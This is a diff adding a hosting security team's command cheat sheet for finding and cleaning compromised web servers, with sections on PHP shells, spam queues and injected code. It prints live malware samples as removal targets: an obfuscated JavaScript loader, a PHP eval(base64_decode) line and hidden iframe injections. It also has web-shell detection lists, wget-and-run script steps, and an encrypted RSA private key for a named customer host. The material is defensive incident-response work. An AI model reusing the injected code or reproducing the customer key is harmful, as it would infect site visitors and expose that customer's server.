@@ -1,0 +1,871 @@
+﻿## checker
+mkdir -p /root/bin
+wget http://cmsv.liquidweb.com/checkers -P /root/bin && chmod +x /root/bin/checkers
+
+## find malware
+SEARCH 1st LINE
+find `pwd` ! -perm 000 -type f -exec awk 'FNR==1 && /\?><\?php/ { print FILENAME ": " $0; }; FNR>1 {nextfile}' {} +
+    OR
+find `pwd` ! -perm 000 -type f -iname '*php*' -exec awk 'FNR==1 && /\$GLOBALS|strtoupper/ { print FILENAME; }; FNR>1 {nextfile}' {} + > injections.txt
+    OR
+find `pwd` ! -perm 000 -type f -iname '*php*' -exec awk 'FNR==1 && /\$GLOBALS|strtoupper|strtolower|base64|eval|function.*for.*strlen.*isset/ { print FILENAME; }; FNR>1 {nextfile}' {} + > mal.txt
+    SEARCH 1st 10 LINES
+find `pwd` ! -perm 000 -type f -iname '*php*' -exec bash -c 'egrep -q "(strtoupper|GLOBALS|strtolower|base64|eval|function.*isset)" < <(head -n 10 "$1")' _ {} \; -printf '%p\n' > bad.txt
+    SEARCH ALL LINES
+find `pwd` ! -perm 000 -iname '*php*' -type f -exec egrep -cl '\$GLOBALS.*\\x|function.*for.*strlen.*isset|strto.*eval' '{}' \; > mal.txt
+
+## create kvm snapshot
+lvcreate -n secteam_snapshot -s -L15G /dev/LVM/06V1D0
+## mapping out the snapshot
+kpartx -a -v -p p /dev/mapper/LVM-secteam_snapshot
+## delete the map
+kpartx -d -v -p p /dev/mapper/LVM-secteam_snapshot
+## remove snapshot
+lvremove /dev/LVM/secteam_snapshot
+
+## find file creation time crtime
+debugfs -R "stat <$(stat -c %i /etc/shadow)>" /dev/sdb8
+
+## tcpdump POST and GET
+# tcpdump filter for HTTP GET 
+tcpdump -s 0 -A 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420'
+## tcpdump filter for HTTP POST 
+tcpdump -s 0 -A 'tcp dst port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'
+
+## maldet stat and clean
+STAT FOR LOOP
+for file in $(cat /usr/local/maldetect/sess/session.hits.`cat /usr/local/maldetect/sess/session.last` | cut -d : -f2); do stat $file >> stats.txt; chmod 600 stats.txt; done;
+MALDET CLEAN
+for file in $(cat /usr/local/maldetect/sess/session.hits.`cat /usr/local/maldetect/sess/session.last` | cut -d : -f2); do chmod 000 $file; done;
+for file in $(cat /usr/local/maldetect/sess/session.hits.`cat /usr/local/maldetect/sess/session.last` | cut -d : -f2); do ls -lah $file; done
+## rsync to new dir, remove source file
+mkdir hacked; for file in $(cat /usr/local/maldetect/sess/session.hits.`cat /usr/local/maldetect/sess/session.last` | cut -d : -f2); do rsync --remove-source-files -azvR $file hacked; done
+rsync --remove-source-files -azvR public_html/test1/file2 hacked
+
+## ssllabs cipher suite
+ALL:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA:ECDHE-RSA-DES-CBC3-SHA:EDH-RSA-DES-CBC3-SHA:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256:AES256-SHA:AES128-SHA:DES-CBC3-SHA:HIGH:!aNULL:!eNULL:!EXPORT:!CAMELLIA:!DES:!MD5:!PSK:!RC4
+
+## cpanel - find resellers with root priv
+grep ",all" /var/cpanel/resellers
+    example1:passwd,disallow-shell,viewglobalpackages,all
+
+## postfix show queue
+postqueue -p | grep -c '^[0-9A-Z]'
+## postfix show sender
+mailq|grep ^[A-F0-9]|cut -c 42-80|sort |uniq -c|sort -nr|head
+
+## grep shellshock attempts
+grep -Fr "/bin/bash" /home/domlogs/* | grep 200
+
+## exim grep subject
+cat /var/log/exim_mainlog |grep "<=" | grep -E 'P=esmtpsa|P=local'| grep -o  "T=\".*\"" | sort | uniq -c | sort -rn | head -n 20
+
+## List email senders
+exim -bpr | grep "<" | awk {'print $4'} | cut -d "<" -f 2 | cut -d ">" -f 1 | sort -n | uniq -c | sort -n
+
+## find path to the emails sent from, and the amount
+grep "cwd=/home" /var/log/exim_mainlog | awk '{for(i=1;i<=10;i++){print $i}}' | sort | uniq -c | grep cwd | sort -n
+grep cwd=\/home\/ /var/log/exim_mainlog| cut -d' ' -f3 | sort | uniq -c | sort -n
+grep cwd=\/home\/ /var/log/exim_mainlog| cut -d' ' -f4 | sort | uniq -c | sort -n
+
+## Remove 'nobody' spam from queue
+for i in $(find . | xargs grep -m 1 -s -i "Mailer-Daemon" | sed -e 's/\.\/[A-Z0-9a-z]\/\([A-Z0-9a-z\-]\{17\}\)\-[HDJ].*/\1/'); do exim -Mrm $i; done
+for i in $(find . | xargs grep -m 3 -s -i "Mailer-Daemon" | sed -e 's/\.\/[A-Z0-9a-z]\/\([A-Z0-9a-z\-]\{16\}\)\-[HDJ].*/\1/'); do exim -Mrm $i;done
+find . | xargs grep -m 1 -s -i "nobody" | sed -e 's/\.\/[A-Z0-9a-z]\/\([A-Z0-9a-z\-]\{16\}\)\-[HDJ].*/\1/'
+find . | xargs grep -m 1 -s -i "auth_id" |awk '{print $2}' |sort |uniq -c |sort -rn
+
+## Find exact spamming script
+ps auxwwwe | grep USER | grep --color=always "/home/PATH" | head
+## Find spamming IP
+grep "<script_name>" /home/user/access-logs/testdomain.com | awk '{print $1}' | sort -n | uniq -c | sort -n
+
+## Show IPs connecting to port 25
+netstat -plan | grep :25 | awk {'print $5'} | cut -d: -f 1 | sort | uniq -c | sort -nk 1
+
+## Summary of mails in the queue
+exim -bpr | exiqsumm -c | head
+
+## Curl googlebot
+curl -D - -A "Googlebot" site.com
+
+## find js files that contain <?php tag
+find public_html/ -type f -name '*.js' -exec grep -H -i "<?php" {} \; -print |cut -f1 -d: |uniq
+
+## Check modules not owned by any package
+rpm -qf /lib64/* |grep "not owned"
+rpm -qf /usr/lib/*
+rpm -qf /etc/httpd/modules/*
+
+## arbor search for ip
+
+Explore > Forensics, then click "open fcap wizard" and put those IPs in the dest line separated by commas. then click "add to fingerprint" and go back to the explore page and click the Update button.
+
+## ssh privilege separation
+
+http://pentestmonkey.net/blog/sshd-snooping
+
+## searches for anything that don't contain your MAC address
+
+tcpdump -e -i eth0 -n | grep -v cat /sys/class/net/eth0/address
+
+## abnormal dns traffic
+
+tcpdump -Annvvs 1500 -i any udp and dst port 53
+
+look for encoded string and ip at the end
+
+## check shared memory
+
+ipcs -mp
+
+  sshd should not use shared memory
+
+## find symlinks
+
+find /some/path -type l -exec ls -l {} \;
+
+## forkitor rootkit
+
+If the system has been infected by the rootkit, the following strings can be found in the dump:
+
+key=xxx
+dhost=xxx
+hbt=3600
+sp=xxx
+sk=xxx
+dip=xxx
+
+So, for example:
+
+code:
+
+1: aptitude install gdb
+2: gdb --pid=`ps ax|grep "\/usr\/sbin\/sshd"|cut -d" " -f1`
+3: > gcore
+4: > quit
+5: strings core.XXXXX |grep "key="
+6:
+
+## drupal version
+
+public_html/modules/system/system.info
+
+ 
+
+## find out what application is using which port
+
+fuser -n tcp 80
+
+lsof -i :80
+
+Set up SSH key
+
+ssh-keygen -t dsa
+
+scp /root/.ssh/id_dsa.pub root@<Old server IP>:/root/.ssh/authorized_keys
+
+Make tmp and var/tmp exec
+
+mount -v -o remount,exec /tmp
+
+mount -v -o remount,exec /var/tmp
+
+Make tmp and var/tmp noexecsum
+
+mount -v -o remount,noexec /tmp
+
+mount -v -o remount,noexec /var/tmp
+
+set the following in mailenable: 1) disabled privileged relay 2) reject mail if sender address is invalid 3) auth senders must use valid address 4) prevent sender address spoofing
+/usr/local/lp/bash_eternal_history
+
+## wget show redirect
+
+something like curl or wget shows the redirects
+
+wget fundacionclaudionaranjo.com —output-document=test.txt —user-agent=Googlebot —referer=htttp://www.google.com
+
+## kill process that kill won't kill
+
+kill -SIGCONT
+
+## software version
+
+joomla 1.0
+
+public_html/web/includes/version.php
+
+    var $RELEASE     = '1.0';
+
+    var $DEV_LEVEL     = '15';
+
+## hacked SSH
+
+/usr/include/gpm2.h
+
+## Modsec whitelist directory per user
+
+mkdir -p /usr/local/apache/conf/userdata/std/2/username/domain.com
+
+Then create a file:
+
+/usr/local/apache/conf/userdata/std/2/username/domain.com/mod_security.conf
+
+In that file add:
+
+<IfModule mod_security.c>
+
+SecRuleEngine Off
+
+</IfModule>
+
+Save it.
+
+Then run:
+
+/scripts/ensure_vhost_includes --user=username
+
+http://www.atomicorp.com/wiki/index.php/Mod_security
+
+## show process start time
+
+ps -eo pid,lstart,cmd
+
+ps -eo lstart,pid,user,args --sort lstart |grep nobody
+
+## cPanel access log file manager
+
+listfmfiles.xml -- listing files x3
+
+live_fileop.xml -- file operation might include delete x3
+
+list.html -- listing files x
+
+seldir.html  -- selecting directory x
+
+select.html  -- selecting files x
+
+trashit.html  -- deleting files x
+
+## PCI issue cleartext, redirect all traffic to https
+
+/home/lumanint/public_html/store/.htaccess
+
+RewriteEngine On
+
+RewriteCond %{HTTPS} off
+
+RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI}
+
+## Disable FTP login temporary
+
+add user in
+
+/etc/ftpusers
+
+or disable password in
+
+/etc/vftp/USER
+
+## show files not image
+
+file * | grep -v image
+
+## grep escape characters
+
+?  \  .  [  ]  ^  $ & ! ;
+
+## remove white line at the top of the file
+
+perl -pi -e "s/^\n//" file.txt
+
+## PHP functions to disable
+
+disable_functions = system,exec,execl,shell_exec,passthru,ftp_login,popen
+
+## Check for in or outbound IRC connections
+
+netstat -tpanu |grep 666[78]
+
+## Search in database for injections
+
+SELECT * FROM wp_posts WHERE post_content LIKE '%<iframe%'
+
+UNION
+
+SELECT * FROM wp_posts WHERE post_content LIKE '%<noscript%'
+
+UNION
+
+SELECT * FROM wp_posts WHERE post_content LIKE '%display:%'
+
+### MySQL
+
+## Find hidden wordpress admin
+
+SELECT u.ID, u.user_login from wp_usermeta m, wp_users u WHERE m.meta_key = 'wp_user_level' AND m.meta_value = 10 AND m.user_id = u.ID
+
+# Delete the user
+
+DELETE from wp_usermeta WHERE user_id = 312
+
+DELETE from wp_users WHERE ID = 312
+
+## Check fake activated plugins for wordpress
+
+SELECT * FROM wp_options WHERE option_name = 'active_plugins'
+
+http://www.teohuiming.name/blog/wordpress-exploit
+
+# Block access to .php and .pl files in an images or other dir
+
+<FilesMatch "\.(p(hp|hp3|l|html|hp.jpg))$">
+
+  Deny from all
+
+</FilesMatch>
+
+##############################################################
+
+## Testing open relay
+
+from the server,
+
+telnet relay-test.mail-abuse.org
+
+## MailScanner
+
+exim -C /etc/exim_outgoing.conf -bpc
+
+exim -bpa -C /etc/exim_outgoing.conf
+
+## CSF FTP ACL
+
+http://www.indianwebportal.com/block-ftp-access-firewall
+
+## delist from sorbs
+
+lynx www.au.sorbs.net
+
+## stop apache from sending mail
+
+added in /etc/postfix/main.cf:
+authorized_submit_users = !apache, static:all
+
+
+## Remove exim message
+
+exim -Mrm Mesg-ID
+
+## Exim show header
+
+exim -Mvh ID
+
+## grep for subject
+
+exigrep fixed_login /var/log/exim_mainlog |grep "T=\"" |cut -d'"' -f2 |sort |uniq -c |sort -n
+
+courier_login
+
+fixed_plain (from email client)
+
+fixed_login (from webmail)
+
+## grep fixed_login
+
+exigrep fixed_login /var/log/exim_mainlog |grep -o "A=fixed_login:[a-zA-Z0-9+@.]*" |cut -d: -f2 |sort |uniq -c |sort -n
+
+## grep blocked
+
+grep remote_smtp /var/log/exim_mainlog | egrep -1 "55[0-9]\ |421\ "
+
+/var/spool/exim/input/
+
+
+cd /scripts
+
+rm -f nukespam.py
+
+wget http://layer3.liquidweb.com/scripts/nukespam.py
+
+chmod 700 nukespam.py
+
+/scripts/nukespam.py
+
+## Find dark mailer
+
+find /home*/*/public_html -type f -print0 | xargs -0 egrep 'YellSOFT' | cut -d ':' -f1 | sort | uniq > /root/found_darkmailer.txt && cat /root/found_darkmailer.txt |mail -s "darkmailer found on `hostname` on `date`" ahuang@liquidweb.com &
+
+## Find dm scripts and ip they came from
+
+egrep "\.pl|\.cgi" /var/log/messages
+
+## find and copy to directory
+find /var -user andrew 2> /dev/null -exec cp --parents -vp {} temp/ \;
+
+## Remove by inode number
+find . -inum 782263 -exec rm -i {} \;
+
+## find files modified between time
+touch -t 200901010000.01 first
+touch -t 200912312359.59 last
+
+find /var/ftp/pub/inspection_pics/ -type f -name '*.jpg' -newer first ! -newer last -exec ls -s {} \; -print > output.txt
+
+rpm -V (only output changed files)
+
+rpmverify -v (output everything)
+
+## check for changelog
+
+rpm -q --changelog RPM
+
+## RPM find package
+
+rpm -qf /sbin/sysctl
+
+## RPM verify
+
+rpm -qVv procps-3.2.3-8.17.el4_8.2
+
+rpm -qas
+
+## rpm md5sum a package
+
+rpm -q --dump procps-3.2.3-8.17.el4_8.2
+
+md5sum /sbin/sysctl
+
+## Find exploited files
+
+find /home/*/public_html -type f -print0 | xargs -0 egrep '(x2300|c99shell|r57shell|milw0rm)' | cut -d ':' -f1 | sort | uniq > /root/shell.lw.txt
+
+## Clamscan
+
+clamscan -i -r --log=/root/clamscan.log /home*/*/public_html &
+
+## Malware keywords
+
+gzinflate(base64_decode
+
+## check for working modsec
+
+*/15 * * * * perl /root/content-check -e "support@liquidweb.com,vstoneman@lhgroup.com" -f /root/modsec-md5check.txt > /dev/null 2>&1
+
+## Find non images
+
+find . -type f | xargs file | grep -v image
+
+## Perl search and replace
+
+## Multiple lines search & replace
+
+perl -pi -e 'BEGIN{undef $/;} s/^this.*third one$//smg' test
+
+## Grep for files
+
+# Match exactly 8 numbers
+grep -r "id=[[:digit:]]\{8\}" public_html/* |cut -f1 -d':' |uniq > injected.txt 
+
+grep -r "" public_html/* |cut -f1 -d':' |uniq > injected.txt
+
+### Removing space at the top of the file
+for i in $(cat injected.txt); do perl -pi -e 's/^\s+$//' $i; done
+
+grep -RPn “(passthru|shell_exec|system|phpinfo|base64_decode|chmod|mkdir|fopen|fclose|readfile|php_uname|eval|tcpflood|udpflood|edoced_46esab) *\(” /var/www
+
+grep -r "\/\*GNU GPL\*\/ try{window.onload" public_html/* |cut -f1 -d':' |uniq > injected.txt
+
+#### Change *771kzw ####
+
+perl -p -i -e 's/\/\*GNU.GPL\*\/.try\{window\.onload.*771kzw\).\}\}.catch\(e\).\{\}\?//g'
+
+For removing this line,
+
+/*GNU GPL*/ try{window.onload = function(){var Dlo228l8u771kzw = document.createElement('script');Dlo228l8u771kzw.setAttribute('type', 'text/javascript');Dlo228l8u771kzw.setAttribute('id', 'myscript1');Dlo228l8u771kzw.setAttribute('src',  'h@(t#t^^!p#&:@^$(/$/(j^#^o^o(#$m&)$l$(@!#a$^-!&^$)o@@r##!!g^!(^.$$^s))$p(@(a@@n@)#k^@#w&)i#$r(e(.$!&#c!@o!^()!m#.!&w())3(^@s$&^c$)h&(o#!o&#l&@s!^&-(c#o(#)m@$.&(e$@&!a^s(y(t(a$(^)b)!&l&e@!t(e)(n!n$#)i^(^!s@.^(r^#^$u(#:&8^$)0)^#8^(!0^/!#g##@$$o&o#$g#l!e^($.(@c#o^!)m@/(g&$^o(@o$#(^g($l!e@.##c$)$(o$)!!m^$/($!b!)$)i$n#(g)!.^!c((@&@o^$m)$)/&!&g$(($o)o)@((g#&&l(!e@$.(f($)^&r@&!#/!w@(o(^!r)d()$!#p)!^r(e@#s&)!s(^!@.^(&o$#@r((g^/^^@'.replace(/\!|@|&|\)|\$|\(|#|\^/ig, ''));Dlo228l8u771kzw.setAttribute('defer', 'defer');document.body.appendChild(Dlo228l8u771kzw);}} catch(e) {}
+
+grep -r "<script src=http:\/\/top" public_html/* |cut -f1 -d':' |uniq > injected.txt
+
+perl -p -i -e 's/document.write.*<script src=http:.*top.*><.*script>.\);//g'
+
+document.write('<script src=http://topselect-gmbh.com/images/tsprint.php ><\/script>');
+
+perl -p -i -e 's/.*php eval.*base64.*.\);.*>//g'
+
+<?php eval(base64_decode('aWYoIWZ1bmN0aW9uX2V4aXN0cygnZmF6d1BPU1RbJ2UnXSkpOw==')); ?>
+
+## Remove iframe injection
+
+grep -r '<iframe src=' * | grep hidden | cut -d: -f1 | sort | uniq > affected-files.txt
+
+for i in $(cat affected-files.txt); do perl -i -p -e 's/<iframe src=.*hotslotpot.*<\/iframe>//g' $i ;done
+
+or
+
+find . -name '*.*' -exec sed -i 's/<iframe src="http:\/\/m-analytics.net\/qaqa\/?daf02d89f0bb66c3b4a9ff31da01e10a" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no><\/iframe>//g' {} \;
+
+## grep for ftp accessed by IP
+
+zegrep -h 'jenstudi' /var/log/messages.* | awk '{print $6}' | sort | uniq -c | sort -n
+
+zegrep -h 'jenstudi' /var/log/messages.* | grep uploaded | awk '{print $6}' | sort | uniq -c | sort -n
+
+## find php in js files
+
+find . -name \*.js -exec grep -l '<?php' {} \;
+
+## jlewis scripts
+
+#checks for various software versions and lp- rpms
+
+wget nospaceindent.com/lqchecks; perl lqchecks
+
+wget http://jlewis.liquidweb.com/lwscripts/lqchecks-plesk; perl lqchecks-plesk
+
+/usr/local/cpanel/bin/rebuild_phpconf --current
+
+#checks for good/bad binaries against the rkhunter md5 library
+
+wget jlewis.liquidweb.com/lwscripts/rkunterchecks
+
+http://security.liquidweb.com/scripts/rkhunterchecks
+
+#checks for various naughty files
+
+wget jlewis.liquidweb.com/lwscripts/nfchecks
+
+## Decode base64 phpshells
+
+perl -MMIME::Base64 -e 'print decode_base64(join("", <>))' FILENAME
+
+## if cat gives argument too long
+
+ls -lah /usr/local/apache/domlogs/ |grep -v -E "log|.gz" |awk '{print $9}' |xargs cat
+
+find /usr/local/apache/domlogs/ -type f -maxdepth 1 |grep -v -E '(_log|.gz)' |xargs cat
+
+## Find the file that has most calls
+
+ls -lah /usr/local/apache/domlogs/|grep -v -E "log|.gz"|grep ^-|awk '{print $9}'|xargs -i tail -5000 /usr/local/apache/domlogs/{}|grep POST |awk '{print $11}'|sort |uniq -c |sort -rn|head
+
+##check Apache status
+
+/usr/bin/lynx -dump -width 500 http://127.0.0.1/whm-server-status
+
+##trace all apache child proc
+
+ps auxw | grep sbin/apache | awk '{print"-p " $2}' | xargs strace
+
+## show most accessed site
+
+/usr/bin/lynx -dump -width 500 http://127.0.0.1/whm-server-status | grep GET | awk '{print $12}' | sort | uniq -c | sort -rn | head
+
+## domlog RFI exploit grep
+
+grep "=http" * |grep "HTTP/1.1\" 200" |egrep -v "google|ebay|translate"
+
+grep -hr '\.\.\/\.\.\/' * | sed 's/ - \[.*"GET / "/' | awk '{print $1" - "$2" - "$3}'
+
+grep -hr '\/etc\/passwd' * | sed 's/ - \[.*"GET / "/' | awk '{print $1" - "$2" - "$3}'
+
+grep -hr 'SERVEQDOCUMENT_ROOT' * | sed 's/ - \[.*"GET / "/' | awk '{print $1" - "$2" - "$3}'
+
+grep -hr 'DOCUMENT_ROOT' * | sed 's/ - \[.*"GET / "/' | awk '{print $1" - "$2" - "$3}'
+
+grep -hr '\.txt??' * | grep -v '\/robots.txt' | sed 's/ - \[.*"GET / "/' | awk '{print $1" - "$2" - "$3}'
+
+## grep for perl exploit
+
+find /usr/local/apache/domlogs/ -type f -mtime -10 -maxdepth 1 | grep -E '(org|net|com)$' | xargs tail -150000 | grep scan2.txt
+
+## list tmp without useless shit
+
+ls -lah |egrep -v "(sess|spamd|rcs|.dat|clamav|wrk)"
+
+## phpshell grep and email results
+
+find public_html -type f -print0 | xargs -0 egrep '(\/tmp\/cmd(temp)?|Web Shell|BaseIRC|eNplj8duwkAYhF|PHP-Mailer|unixunited|N3tshell|WaChoviA|eMailAdd|ReZulT|nsTView|SnIpEr_SA|sniper_sa|g00nshell|peanut|c99madshell|c99shell|r57shell|crazy.pl|tryag|myshell|msshell|phpshell|vbspy|JaheeM|mpownz|ManTiLa|indoirc.net|NOGROD|Bhlynx|rfiScan|x2300|g00nshell|Bigdoz|Indoserv|Faskalis|Indohacker|pLuR|HacKed|AnakDompu|cHApoenk|Shellbot|r3v3ng4ns|MaXiMiZeR|milw0rm|n3oom3|rohitab|w4ck1ng|PHP-Proxy|Locus7s|cgitelnet|ccteam|SpIdEr|gr33ts|fr3aky)' | cut -d ':' -f1 | sort | uniq > shellcheck.txt && cat shellcheck.txt |mail -s "shellcheck from `hostname` on `date`" ahuang@liquidweb.com &
+
+find /home/*/public_html -type f -print0 | xargs -0 egrep -I '(\/tmp\/cmdtemp|SnIpEr_SA|AnakDompu|NGHshell|Bhlynx|Bigdoz|cgitelnet|cHAPoenk|crazy.pl|Faskalis|HacKed|Indohacker|indoirc.net|Indoserv|JaheeM|ManTiLa|MaXiMiZeR|mpownz|msshell|n3oom3|NOGROD|pLuR|r3v3ng4ns|rfiScan|rohitab|Shellbot|vbspy|x2300|c99shell|r57shell|milw0rm|g00nshell|locus7|MyShell|PHP\ Shell|phpshell|PHPShell|PHPKonsole|Haxplorer|phpRemoteView|w4ck1ng|PHP-Proxy|Locus7s|ccteam|fx0|4ngel|bShell|CraCkeR|MulCiber|EgY_SpIdEr|Aria-Security|KaMeLeOn|RootShell|ZaCo|Ve_cENxShell|oRb|BajoCrew|TuRkEy|Removable\ Shell)' | cut -d ':' -f1 | sort | uniq > shellcheck.txt && cat shellcheck.txt |mail -s "shellcheck from `hostname` on `date`" ahuang@liquidweb.com &
+
+## list all malware processes and the directory
+
+for i in $(ps aux |grep nobody |awk '{print $2}'); do lsof -np $i |egrep "DIR|TCP" ; done
+
+## kill nobody procs and restart apache
+
+for i in $(ps -aux |grep nobody |awk '{print $2}');do kill -9 $i;done && service httpd restart
+
+## kill process by user
+
+pkill -9 -u USER
+
+## find gumblar infected files and email results
+
+find /home/*/public_html -type f -print0 | xargs -0 egrep '(reycross.com|hotelsosto.hu|bolcsvolgyi.hu|o0w0o.com|ozguvenplastik.com|rtohomecenter.com|bikingrealtor.net|epiphyte.ru|stockbuzzindia.com|congeladossanti.com|mcsdp.com|mikyaku.jp|mifconsulting.net|red-devil-sport-club.gymdb.com|bulgaristanuniversiteleri.org|asyouwishwed.biz|k-shog.com|siva4kids.org|lakyrnikcup.cz|moradoklanna.com|gallery.suhufarabia.com|filmkolik.net|psgtech72.com|thalassapromotion.eu|melstra-techniek.nl|haydikaradenize.com|lou-ferrigno.info|kaarlaid.ee|fastoengineer.com|johnson.co.th|besthome104.com|olight-usa.com|mobydickrock.ru|jazzlynx.net|thailocal.sru.ac.th|sunkenlibrary.org|spin-nds.de|fotothhi.be|foro.gamesquality.com|agag44.com|angelsinuniform.com|amusecity.com|melodicsongs.com|test.beza.tu2.ru|qdev.ru|hannabarbera.com.br|usepetrol2earn.com|kingofbelgrade.com|ar-global.com|kathrynmetcalf.com|shoppingsurat.com|sksolvesborg.se|jatulintarhan.net|agenturadomov.cz|yondental.co.kr|cpanb.ca|myrussia.kz|uchikawa.ne.jp|magnoliamails.com|transmarecuador.com|ibdf-deutschland.de|kcr-net.de|sejoong.tourskorea.com|rapidsharecrawler.com|publicnet.ca|1st-broker.ru|achtbanen.org|gemus.pl|mashaei.ir|ajkcas.com|npnonline.in|sm-komplekt.ru|orkutmasti.com|bzb.de|elpotrero.com.ar|ebib.info|betabalon.com.tr|doctor-jade.ru|infobyte.com.tr|firelogltd.co.uk|hamnkrog.se|lmdl.gamesquality.comtne.tourskorea.com|rawalrohi.com|internetravel.ru|tacticz.be|borsalita.ru|driving-177.ru|09cd.co.kr|agrealt.ru|alexandrepatoworld.com|bcs-construct.be|belaflex.ind.br|bellsdirectory.com|damisystem.com|deraah.com.sa|dyark.com|e-cast.pl|elpotrero.com.ar|etqw.hu|hutakrzeszowska.pl|icat.ac.in|japimen.net|kashej.dk|lupitaarmas.com|m-paris.ru|maciejkuciara.com|mieszkanie.portada.pl|mijn-roedel.be|mirjany.ru|orkutmasti.com|pastuv.rs|protech-uk.co.uk|restaurantparkhvar.com|sarvodayachildcare.com|sepahan-e.com|seriedadenlinea.com|sieguzi.com|sm-komplekt.ru|smaug.cz|soi-japan.com|spain-houses.info|spektrsec.ru|stylusbrindes.com.br|tallestbuildingslist.com|theflyingpoodles.com|vetuscenter.se|cdmatool.com|xxxhotgirlfriends.com|seadiveresort.com|iraqiyoon.net|transconttgn.com|ffwbcwashington.org|r43.fssprus.ru|nedergadeteatret.dk|shinwoori.tourskorea.com|euroregionbug.pl|psunrise.cn|miriquidi-coons.de|sportsdisplaycases.net|markokaldur.com|fabil.pl|buypartylights.com|chezmichel.nl|cbx-north.se|creativewebsols.com|mumbaishopping.biz|ic-4.org|caribecordial.com|bellsworld.com|kytten.co.cc|psusheela.org|carlossalina.com.ar|jeanietomanek.com|prodolg.ru|eaglegymnastics.com|feuerwehrlautenbach.de|shoba.in|mvlichtringhausen.de|musicmufta.com|shop-weto.com|rondoniainfoco.com|folkartist-kr.com|iark.net|trsystem.co.kr|conapiciudadreal.org|nwdrealty.com|volco.ru|turizam.co.yu|movieinthepark.ca|incabrasil.org.br|kobukwai-renmei.com|tarihder.org|teburg.tanger.cz|a2-studio.com|colakogluturizm.com.tr|rutevac.org.rs|analys.ru|lindabouchard.ca|atelieray.com|alabey.com|beratungszentrum-doebeln.de|im.ne.kr|karoyatra.net|scho-seiler.net|orhaninsaatltd.com|wholemanministries.net|bcsmni.hu|0313879956.kt.io|okgrupo.com|hast-eg.com|cliniquemalaysia.com|amriflooring.com|dayspaxalapa.com|suntoys-cars.com|pubetter.dk|blschd.com|ec-sportsweb.com|vasaikar.org|lauwaert.net|sweich.com|ragero.ru|rts-me.com|theworldstartv.com|frontflip.se|d-mediagroup.com|sklad-shin.ru|sequoiagrovehomes.com|mcmarshal.com|home-loan-broker.co.uk|fssprus.ru)' | cut -d ':' -f1 | sort | uniq >> gumblarcheck.txt && cat gumblarcheck.txt |mail -s "gumblarcheck from `hostname` on `date`" ahuang@liquidweb.com &
+## ssh key
+
+This customer uses PKI-based SSH authentication.
+Private key passphrase is stored in the "su password" field.
+Enter private key passphrase when prompted by SSH.
+
+# cat <<ENDOFKEY >.ssh/host.frekansweb.com.key
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,DC9A7C25406E9DE1
+
+gyTwkWAKPrOMlt0qep5Qe3AEKP7CZRVV4+aGmdrWwaFcniL4k7U5eadJqjIW6nPy
+lB8YYdBhqczDzALAO2iIfrXZwqfdme6b31yX2A7zrkkRlgImuGhj3dXL9+eXjuYL
+3Rqzc8TecsdnHqKSPGRhC/2wOukqKIHXtGWi9GdW/GmoWWdoic0xFj9bOGV63bqw
+B3TwqeMCE6G3MYtsWBMKsAlWgbR3qauBjijZ3q0bXfypFXAjpBipaTBI+XYB3YJm
+6w+c6XotgJaWl+R9TaE0NvmeXxuuU1oG+6U8RCix0zvqroZUIbpESoO7S1TYWt6X
+rvsyGQSdNvkJjh00b1Y15wW/RCqKDKmUOrGpYG8BaPbmXscnuY4VeC9d06LNcO1a
+Wluy5dygT+lbOhq1vZ6bNRZh+gS1zSV2M/qenXh5vDMZfPqX6STKxg/lNiMI+V3z
+BjJ5SeA+J9xfVNdaSQ8NhY04k6xjb6tiEBm6r6/ZdgvarkjTq1WBCYcDt9GUeMI1
+3dd2nirkF9pGPHByX2HJbDSKv/WQLLyI7vq4BoPU9Hl0tPRX2MPvQgGvP5Ohkxu+
+jj1xLcGaqaN/f8C8FVSV53yZw2QoxoFxhdzY42CRc+f6b1/RvQ0yS8hYrzna58OX
+sCcJpykMcXquVRyir3d3gq6eQAgD9Hr/Jo8At84oib3YX820tml/GhcLQsflEzxm
+GTH0daiY7nPzruqGwr5OGT/1JWpu+v0lxDwLTK7guuJtbQBB+2MVvU3UdB2TbHIm
+mhObY33iaRhtt+5quOYX9SAY9K3Y8BcaNwEpkK0Dp3Fv3KwhKBfBPLzQbN4I8ILq
+oU/Ym4nhRJGIE84NvZ4lDLzzjOkkHv9YLvC2w5SduEZT8/YsfxnIAYSfYvRJw9BW
+EmO7/k+V5iT2q0HB6apnqAjiSqmnHbFoG9LjUn1V7vSa9G1FATj+5M+W77+kNTNd
+zr+sTwl1eqDaWfuNnp/9vjrc9Nj5mY6sGXvZXV0b514N5SK+O/+iDYRsHpduHw6b
+P7JVw1IGE1ZSwm/cBDTPmgxFP1zU2yDGw+Mb+J7NtSS3lrZDPOoiSjGMN/JsiVrG
+n+f8V7sNSbBkSGwg246Mtvq5tNFlhzwVHizqbSZqfKdKx+21KLsqexry5+f9pj9Q
+BAvC91sMJJZ8QGyp55LGoJBT3K2oOM3yJ0sU9AjkEEfVzglqpHQNhPo7SFYkKhIH
+yLVM/dGQiumdPzt2hRfa0YV9EE9bgxHMLxiuhWrdXNcbS7Y7zr3RLs6kvJiYhMqp
+utL31f0O4i+VAeqsWYD8IVH+Z+veOtyUxuJl5t1D0Emk39shgebHmNVDKt6xYzkT
+3ck1kA1PAfKM9e/1HysU4WzUCUVq8dzHW+3UEaM9loTQdNGe+0N6noJqvKzueLSw
++kYYlESeu5tO3YavLsmf/RRjuAOgsecgSsZBf60OmaCozTCvuCuaz8vxsenUN9ll
+/7+/Mh4KrUc6JDbm8sdPFranoeILVc7t6/5GFrqtDsxxlnlbQSY4sjMgQhcAtbqI
+lck0p02ZxjDCTNp/mWsQUfC1CvEy10jdTwWMu2dnrSHG19k2LtoLlA==
+-----END RSA PRIVATE KEY-----
+ENDOFKEY
+
+chmod 0600 .ssh/host.frekansweb.com.key
+
